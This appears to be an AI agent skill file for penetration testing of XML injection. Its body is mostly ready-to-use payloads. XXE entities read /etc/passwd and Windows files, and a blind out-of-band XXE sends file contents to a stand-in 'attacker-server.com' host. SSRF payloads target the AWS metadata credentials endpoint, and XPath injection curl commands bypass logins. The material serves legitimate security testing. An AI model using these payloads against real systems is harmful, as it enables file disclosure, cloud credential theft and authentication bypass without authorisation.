---
name: testing-for-xml-injection-vulnerabilities
description: Test web applications for XML injection vulnerabilities including XXE,
when-to-use: Test web applications for XML injection vulnerabilities including XXE,
  XPath injection, and XML entity attacks to identify data exposure and server-side
  request forgery risks.
domain: cybersecurity
subdomain: web-application-security
tags:
- xml-injection
- xxe
- xpath-injection
- xml-parsing
- web-security
- entity-injection
- dtd-attack
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1055
---

# Testing for XML Injection Vulnerabilities

## When to Use
- When testing applications that process XML input (SOAP APIs, XML-RPC, file uploads)
- During penetration testing of applications with XML parsers
- When assessing SAML-based authentication implementations
- When testing file import/export functionality that handles XML formats
- During API security testing of SOAP or XML-based web services

## Prerequisites
- Burp Suite with XML-related extensions (Content Type Converter, XXE Scanner)
- XMLLint or similar XML validation tools
- Understanding of XML structure, DTDs, and entity processing
- Python 3.x with lxml and requests libraries
- Access to an out-of-band interaction server (Burp Collaborator, interact.sh)
- Sample XXE payloads from PayloadsAllTheThings repository

## Workflow

### Step 1 — Identify XML Processing Endpoints
```bash
# Look for endpoints accepting XML content types
# Content-Type: application/xml, text/xml, application/soap+xml
# Check WSDL files for SOAP services
curl -s http://target.com/service?wsdl

# Test if endpoint accepts XML by changing Content-Type
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>hello</test></root>'

# Check for XML file upload functionality
# Look for .xml, .svg, .xlsx, .docx file processing
```

### Step 2 — Test for Basic XXE (File Retrieval)
```xml
<!-- Basic XXE to read local files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows file retrieval -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>

<!-- Using PHP wrapper for base64-encoded file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Step 3 — Test for Blind XXE with Out-of-Band Detection
```xml
<!-- Out-of-band XXE using external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
  %xxe;
]>
<root><data>test</data></root>

<!-- External DTD file (xxe.dtd hosted on attacker server) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?data=%file;'>">
%eval;
%exfil;

<!-- DNS-based out-of-band detection -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
]>
<root><data>&xxe;</data></root>
```

### Step 4 — Test for SSRF via XXE
```xml
<!-- Internal network scanning via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- AWS metadata endpoint access -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>

<!-- Internal port scanning -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root><data>&xxe;</data></root>
```

### Step 5 — Test for XPath Injection
```bash
# Basic XPath injection in search parameters
curl "http://target.com/search?query=' or '1'='1"

# XPath authentication bypass
curl -X POST http://target.com/login \
  -d "username=' or '1'='1&password=' or '1'='1"

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
